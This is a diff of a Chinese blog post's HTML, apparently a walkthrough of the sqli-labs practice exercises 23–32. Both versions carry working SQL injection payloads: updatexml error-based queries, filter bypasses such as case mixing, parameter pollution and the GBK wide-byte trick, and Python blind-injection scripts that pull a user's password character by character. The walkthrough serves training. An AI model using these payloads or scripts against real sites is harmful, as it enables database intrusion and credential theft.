@@ -2,15 +2,6 @@
 
 
 
-
-
-
-
-
-
-
-
-
   
 
 
@@ -18,11 +9,8 @@
 <head>
   <meta charset="UTF-8"/>
 <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
 <meta name="theme-color" content="#222">
-
-
-
 
 
 
@@ -50,6 +38,10 @@
 
 
 
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
 
 
 
@@ -58,25 +50,46 @@
 
 <link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
 
-<link href="/css/main.css?v=6.3.0" rel="stylesheet" type="text/css" />
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
 
 
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.ico?v=5.1.4">
 
 
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
 
 
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
 
 
-  <link rel="mask-icon" href="/images/logo.svg?v=6.3.0" color="#222">
-
-
-
+  <link rel="mask-icon" href="/images/favicon.ico?v=5.1.4" color="#222">
 
 
 
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="less-231?id=1&apos; or &apos;1&apos;=&apos; 成功闭合payload：1?id=1&apos; or (updatexml(1,concat(0x7e,(select user()),0x7e),1)) or &apos;1&apos;=&apos;1 less-24说实话没看懂这题让干啥 less-25过滤了or没过率 |1?id=1&apos; || updatexml(1,concat(0x7e,(select user()),0x7e)">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli-labs (less23-less38)">
+<meta property="og:url" content="http://altmanz.cn/2018/02/06/sqli-labs 2/index.html">
+<meta property="og:site_name" content="Altm4nz">
+<meta property="og:description" content="less-231?id=1&apos; or &apos;1&apos;=&apos; 成功闭合payload：1?id=1&apos; or (updatexml(1,concat(0x7e,(select user()),0x7e),1)) or &apos;1&apos;=&apos;1 less-24说实话没看懂这题让干啥 less-25过滤了or没过率 |1?id=1&apos; || updatexml(1,concat(0x7e,(select user()),0x7e)">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-02-09T15:43:07.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sqli-labs (less23-less38)">
+<meta name="twitter:description" content="less-231?id=1&apos; or &apos;1&apos;=&apos; 成功闭合payload：1?id=1&apos; or (updatexml(1,concat(0x7e,(select user()),0x7e),1)) or &apos;1&apos;=&apos;1 less-24说实话没看懂这题让干啥 less-25过滤了or没过率 |1?id=1&apos; || updatexml(1,concat(0x7e,(select user()),0x7e)">
 
 
 
@@ -85,13 +98,15 @@
   var CONFIG = {
     root: '/',
     scheme: 'Muse',
-    version: '6.3.0',
-    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
-    fancybox: false,
-    fastclick: false,
-    lazyload: false,
+    version: '5.1.4',
+    sidebar: {"position":"right","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
     tabs: true,
     motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
     algolia: {
       applicationID: '',
       apiKey: '',
@@ -103,37 +118,12 @@
 </script>
 
 
-  
-
-
-
-
-  <meta name="description" content="less-231?id=1&amp;apos; or &amp;apos;1&amp;apos;=&amp;apos; 成功闭合payload：1?id=1&amp;apos; or (updatexml(1,concat(0x7e,(select user()),0x7e),1)) or &amp;apos;1&amp;apos;=&amp;apos;1 less-24说实话没看懂这题让干啥 less-25过滤了or没过率 |1?id=1&amp;apos; ||">
-<meta property="og:type" content="article">
-<meta property="og:title" content="sqli-labs (less23-less38)">
-<meta property="og:url" content="http://altmanz.cn/2018/02/06/sqli-labs 2/index.html">
-<meta property="og:site_name" content="Altm4nz">
-<meta property="og:description" content="less-231?id=1&amp;apos; or &amp;apos;1&amp;apos;=&amp;apos; 成功闭合payload：1?id=1&amp;apos; or (updatexml(1,concat(0x7e,(select user()),0x7e),1)) or &amp;apos;1&amp;apos;=&amp;apos;1 less-24说实话没看懂这题让干啥 less-25过滤了or没过率 |1?id=1&amp;apos; ||">
-<meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-02-09T15:43:07.000Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="sqli-labs (less23-less38)">
-<meta name="twitter:description" content="less-231?id=1&amp;apos; or &amp;apos;1&amp;apos;=&amp;apos; 成功闭合payload：1?id=1&amp;apos; or (updatexml(1,concat(0x7e,(select user()),0x7e),1)) or &amp;apos;1&amp;apos;=&amp;apos;1 less-24说实话没看懂这题让干啥 less-25过滤了or没过率 |1?id=1&amp;apos; ||">
-
-
-
-
-
 
   <link rel="canonical" href="http://altmanz.cn/2018/02/06/sqli-labs 2/"/>
 
 
 
-<script type="text/javascript" id="page.configurations">
-  CONFIG.page = {
-    sidebar: "",
-  };
-</script>
+
 
   <title>sqli-labs (less23-less38) | Altm4nz</title>
   
@@ -145,34 +135,6 @@
 
 
 
-
-  <noscript>
-  <style type="text/css">
-    .use-motion .motion-element,
-    .use-motion .brand,
-    .use-motion .menu-item,
-    .sidebar-inner,
-    .use-motion .post-block,
-    .use-motion .pagination,
-    .use-motion .comments,
-    .use-motion .post-header,
-    .use-motion .post-body,
-    .use-motion .collection-title { opacity: initial; }
-
-    .use-motion .logo,
-    .use-motion .site-title,
-    .use-motion .site-subtitle {
-      opacity: initial;
-      top: initial;
-    }
-
-    .use-motion {
-      .logo-line-before i { left: initial; }
-      .logo-line-after i { right: initial; }
-    }
-  </style>
-</noscript>
-
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -182,7 +144,7 @@
     
   
 
-  <div class="container sidebar-position-left page-post-detail">
+  <div class="container sidebar-position-right page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -191,17 +153,19 @@
     
 
     <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
+      <a href="/"  class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
         <span class="site-title">Altm4nz</span>
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
-    
+      
+        <p class="site-subtitle"></p>
+      
   </div>
 
   <div class="site-nav-toggle">
-    <button aria-label="Toggle navigation bar">
+    <button>
       <span class="btn-bar"></span>
       <span class="btn-bar"></span>
       <span class="btn-bar"></span>
@@ -209,37 +173,35 @@
   </div>
 </div>
 
-
-
 <nav class="site-nav">
+  
+
   
     <ul id="menu" class="menu">
       
         
-        
-        
-          
-          <li class="menu-item menu-item-home">
-    <a href="/" rel="section">
-      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Home</a>
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-archives">
-    <a href="/archives/" rel="section">
-      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archives</a>
-  </li>
-
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
       
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
       
     </ul>
-  
-
-  
-    
-
   
 
   
@@ -247,20 +209,12 @@
 
 
 
-  
-
-
-
-</div>
+ </div>
     </header>
-
-    
-
 
     <main id="main" class="main">
       <div class="main-inner">
         <div class="content-wrap">
-          
           <div id="content" class="content">
             
 
@@ -273,8 +227,6 @@
   
   
 
-  
-
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
   
   
@@ -285,7 +237,7 @@
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Altm4nz">
       <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="image" content="/images/IMG_4178.JPG">
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
@@ -297,50 +249,25 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">sqli-labs (less23-less38)
-              
-            
-          </h1>
+          <h1 class="post-title" itemprop="name headline">sqli-labs (less23-less38)</h1>
         
 
         <div class="post-meta">
           <span class="post-time">
-
-            
-            
-            
-
             
               <span class="post-meta-item-icon">
                 <i class="fa fa-calendar-o"></i>
               </span>
               
-                <span class="post-meta-item-text">Posted on</span>
+                <span class="post-meta-item-text">发表于</span>
               
-
-              
-                
-              
-
-              <time title="Created: 2018-02-06 00:00:00" itemprop="dateCreated datePublished" datetime="2018-02-06T00:00:00+08:00">2018-02-06</time>
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-02-06T00:00:00+08:00">
+                2018-02-06
+              </time>
             
 
             
-              
 
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2018-02-09 23:43:07" itemprop="dateModified" datetime="2018-02-09T23:43:07+08:00">2018-02-09</time>
-              
             
           </span>
 
@@ -372,37 +299,34 @@
       
 
       
-        <h3 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; or &apos;1&apos;=&apos;</span><br></pre></td></tr></table></figure>
-<p>成功闭合<br>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; or (updatexml(1,concat(0x7e,(select user()),0x7e),1)) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p>
+        <h3 id="less-23"><a href="#less-23" class="headerlink" title="less-23"></a>less-23</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>' or '<span class="number">1</span>'='</span><br></pre></td></tr></table></figure>
+<p>成功闭合<br>payload：<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>' or (updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select user()),<span class="number">0x7e</span>),<span class="number">1</span>)) or '<span class="number">1</span>'='<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
 <h3 id="less-24"><a href="#less-24" class="headerlink" title="less-24"></a>less-24</h3><p>说实话没看懂这题让干啥</p>
-<h3 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h3><p>过滤了or没过率 |<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; || updatexml(1,concat(0x7e,(select user()),0x7e),1)) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p>
+<h3 id="less-25"><a href="#less-25" class="headerlink" title="less-25"></a>less-25</h3><p>过滤了or没过率 |<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>' || updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select user()),<span class="number">0x7e</span>),<span class="number">1</span>)) or '<span class="number">1</span>'='<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
 <p>而且他只是过滤删去了or，可以重写绕过。</p>
-<h3 id="less-25a"><a href="#less-25a" class="headerlink" title="less-25a"></a>less-25a</h3><p>上题的基础下进行盲注入<br>脚本如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    for j in range(33,127):</span><br><span class="line">        payload =&quot;http://localhost/sql/Less-25a/?id=-1 || ascii(mid((select passwoorrd from users where username=&apos;admin2&apos;),%d,1))=%d&quot;%(i,j)</span><br><span class="line">        r= requests.get(url=payload)</span><br><span class="line">        if &quot;Dumb&quot; in r.content:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br><span class="line">print result</span><br></pre></td></tr></table></figure></p>
-<h3 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h3><p>空格绕过 用()绕过空格就好了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;||updatexml(1,concat(0x7e,(select(database())),0x7e),1)||&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p>
-<h3 id="less-26a"><a href="#less-26a" class="headerlink" title="less-26a"></a>less-26a</h3><p>上一题的忙注版本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    for j in range(33,127):</span><br><span class="line">        payload =&quot;http://localhost/sql/Less-26a/?id=1&apos;anandd(ascii(mid((select(passwoorrd)from(users)where(username=&apos;admin2&apos;)),%d,1))=%d)anandd&apos;1&apos;=&apos;1&quot;%(i,j)</span><br><span class="line">        r= requests.get(url=payload)</span><br><span class="line">        if &quot;Dumb&quot; in r.content:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br></pre></td></tr></table></figure></p>
-<h3 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h3><p>过滤并不严格<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$id= preg_replace(&apos;/[\/\*]/&apos;,&quot;&quot;, $id);		//strip out /*</span><br><span class="line">$id= preg_replace(&apos;/[--]/&apos;,&quot;&quot;, $id);		//Strip out --.</span><br><span class="line">$id= preg_replace(&apos;/[#]/&apos;,&quot;&quot;, $id);			//Strip out #.</span><br><span class="line">$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);	    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/select/m&apos;,&quot;&quot;, $id);	    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/[ +]/&apos;,&quot;&quot;, $id);	    //Strip out spaces.</span><br><span class="line">$id= preg_replace(&apos;/union/s&apos;,&quot;&quot;, $id);	    //Strip out union</span><br><span class="line">$id= preg_replace(&apos;/select/s&apos;,&quot;&quot;, $id);	    //Strip out select</span><br><span class="line">$id= preg_replace(&apos;/UNION/s&apos;,&quot;&quot;, $id);	    //Strip out UNION</span><br><span class="line">$id= preg_replace(&apos;/SELECT/s&apos;,&quot;&quot;, $id);	    //Strip out SELECT</span><br><span class="line">$id= preg_replace(&apos;/Union/s&apos;,&quot;&quot;, $id);	    //Strip out Union</span><br><span class="line">$id= preg_replace(&apos;/Select/s&apos;,&quot;&quot;, $id);	    //Strip out select</span><br></pre></td></tr></table></figure></p>
-<p>大小写绕过就行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;and(updatexml(1,concat(0x7e,(sEleCt(password)from(users)where(username=&apos;admin2&apos;)),0x7e),1))and&apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure></p>
+<h3 id="less-25a"><a href="#less-25a" class="headerlink" title="less-25a"></a>less-25a</h3><p>上题的基础下进行盲注入<br>脚本如下：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">import requests</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,100):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(33,127):</span><br><span class="line">        payload =<span class="string">"http://localhost/sql/Less-25a/?id=-1 || ascii(mid((select passwoorrd from users where username='admin2'),%d,1))=%d"</span>%(i,j)</span><br><span class="line">        r= requests.<span class="builtin-name">get</span>(<span class="attribute">url</span>=payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Dumb"</span> <span class="keyword">in</span> r.content:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            <span class="builtin-name">print</span> flag</span><br><span class="line">            break</span><br><span class="line"><span class="builtin-name">print</span> result</span><br></pre></td></tr></table></figure></p>
+<h3 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h3><p>空格绕过 用()绕过空格就好了<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>'||updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select(database())),<span class="number">0x7e</span>),<span class="number">1</span>)||'<span class="number">1</span>'='<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="less-26a"><a href="#less-26a" class="headerlink" title="less-26a"></a>less-26a</h3><p>上一题的忙注版本<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        payload =<span class="string">"http://localhost/sql/Less-26a/?id=1'anandd(ascii(mid((select(passwoorrd)from(users)where(username='admin2')),%d,1))=%d)anandd'1'='1"</span><span class="symbol">%</span>(i,j)</span><br><span class="line">        r= requests.<span class="built_in">get</span>(url=payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Dumb"</span> <span class="keyword">in</span> r.<span class="built_in">content</span>:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            <span class="built_in">print</span> flag</span><br><span class="line">            <span class="built_in">break</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h3><p>过滤并不严格<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/[\/\*]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);		<span class="regexp">//strip</span> out /*</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/[--]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);		<span class="regexp">//</span>Strip out --.</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/[#]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);			<span class="regexp">//</span>Strip out <span class="comment">#.</span></span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);	    <span class="regexp">//</span>Strip out spaces.</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/select/m'</span>,<span class="string">""</span>, <span class="variable">$id</span>);	    <span class="regexp">//</span>Strip out spaces.</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/[ +]/'</span>,<span class="string">""</span>, <span class="variable">$id</span>);	    <span class="regexp">//</span>Strip out spaces.</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/union/s'</span>,<span class="string">""</span>, <span class="variable">$id</span>);	    <span class="regexp">//</span>Strip out union</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/select/s'</span>,<span class="string">""</span>, <span class="variable">$id</span>);	    <span class="regexp">//</span>Strip out select</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/UNION/s'</span>,<span class="string">""</span>, <span class="variable">$id</span>);	    <span class="regexp">//</span>Strip out UNION</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/SELECT/s'</span>,<span class="string">""</span>, <span class="variable">$id</span>);	    <span class="regexp">//</span>Strip out SELECT</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/Union/s'</span>,<span class="string">""</span>, <span class="variable">$id</span>);	    <span class="regexp">//</span>Strip out Union</span><br><span class="line"><span class="variable">$id</span>= preg_replace(<span class="string">'/Select/s'</span>,<span class="string">""</span>, <span class="variable">$id</span>);	    <span class="regexp">//</span>Strip out select</span><br></pre></td></tr></table></figure></p>
+<p>大小写绕过就行<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1'and(updatexml(1,concat(0x7e,(<span class="keyword">sEleCt</span>(<span class="keyword">password</span>)<span class="keyword">from</span>(<span class="keyword">users</span>)<span class="keyword">where</span>(username=<span class="string">'admin2'</span>)),<span class="number">0x7e</span>),<span class="number">1</span>))<span class="keyword">and</span><span class="string">'1'</span>=<span class="string">'1</span></span><br></pre></td></tr></table></figure></p>
 <h3 id="less-27a"><a href="#less-27a" class="headerlink" title="less-27a"></a>less-27a</h3><p>依旧是27题的盲注，就不写了</p>
-<h3 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h3><p>试了半天没回显 最后发现是个盲注 //不按套路走 不是加a才是盲注的吗= =<br>脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    for j in range(33,127):</span><br><span class="line">        payload =&quot;http://localhost/sql/Less-28/?id=1&apos;)and(ascii(mid((sElEct(password)from(users)where(username=&apos;admin2&apos;)),%d,1))=%d)and(&apos;1&apos;=&apos;1&quot;%(i,j)</span><br><span class="line">        r= requests.get(url=payload)</span><br><span class="line">        if &quot;Dumb&quot; in r.content:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            print flag</span><br><span class="line">            break</span><br></pre></td></tr></table></figure></p>
+<h3 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h3><p>试了半天没回显 最后发现是个盲注 //不按套路走 不是加a才是盲注的吗= =<br>脚本：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">import requests</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,100):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(33,127):</span><br><span class="line">        payload =<span class="string">"http://localhost/sql/Less-28/?id=1')and(ascii(mid((sElEct(password)from(users)where(username='admin2')),%d,1))=%d)and('1'='1"</span>%(i,j)</span><br><span class="line">        r= requests.<span class="builtin-name">get</span>(<span class="attribute">url</span>=payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Dumb"</span> <span class="keyword">in</span> r.content:</span><br><span class="line">            flag += chr(j)</span><br><span class="line">            <span class="builtin-name">print</span> flag</span><br><span class="line">            break</span><br></pre></td></tr></table></figure></p>
 <h3 id="less-28a"><a href="#less-28a" class="headerlink" title="less-28a"></a>less-28a</h3><p>没看出来和28有啥区别 用28的脚本也能跑出来。。</p>
-<h3 id="less-29"><a href="#less-29" class="headerlink" title="less-29"></a>less-29</h3><p>很轻松就饶过了。。我咋没看出来the best firewall在哪。。。？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; or updatexml(1,concat(0x7e,(select password from users where username=&apos;admin2&apos;),0x7e),1) %23</span><br></pre></td></tr></table></figure></p>
-<p>看了源码 在login.php中，他会先将参数放入数组，然后读取语句的时候取数组第一个值，对id[1]进行过滤。<br>但是如果我们传入两个id=1&amp;id=2，sql查询的时候会取第二个参数，这样就能绕过waf<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&amp;id=-1&apos; union select 1,2,3  %23</span><br></pre></td></tr></table></figure></p>
+<h3 id="less-29"><a href="#less-29" class="headerlink" title="less-29"></a>less-29</h3><p>很轻松就饶过了。。我咋没看出来the best firewall在哪。。。？<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">id</span>=1' <span class="keyword">or</span> updatexml(1,concat(0x7e,(select password <span class="keyword">from</span><span class="built_in"> users </span>where <span class="attribute">username</span>=<span class="string">'admin2'</span>),0x7e),1) %23</span><br></pre></td></tr></table></figure></p>
+<p>看了源码 在login.php中，他会先将参数放入数组，然后读取语句的时候取数组第一个值，对id[1]进行过滤。<br>但是如果我们传入两个id=1&amp;id=2，sql查询的时候会取第二个参数，这样就能绕过waf<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>&amp;id=<span class="number">-1</span>' union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>  %<span class="number">23</span></span><br></pre></td></tr></table></figure></p>
 <h3 id="less-30"><a href="#less-30" class="headerlink" title="less-30"></a>less-30</h3><p>上一题的盲注版本，脚本不写了</p>
 <h3 id="less-31"><a href="#less-31" class="headerlink" title="less-31"></a>less-31</h3><p>和30题同解。。.</p>
-<h3 id="less-32"><a href="#less-32" class="headerlink" title="less-32"></a>less-32</h3><p>宽字节注入<br>单引号前被加了反斜杠转义，无法正常闭合。<br>但是如果使用了GBK编码，那么%df%5c会被认为是一个字，就可以使单引号逃逸。<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sql/Less-32/?id=1%df%27 or updatexml(1,concat(0x7e,user(),0x7e),1)%23</span><br></pre></td></tr></table></figure></p>
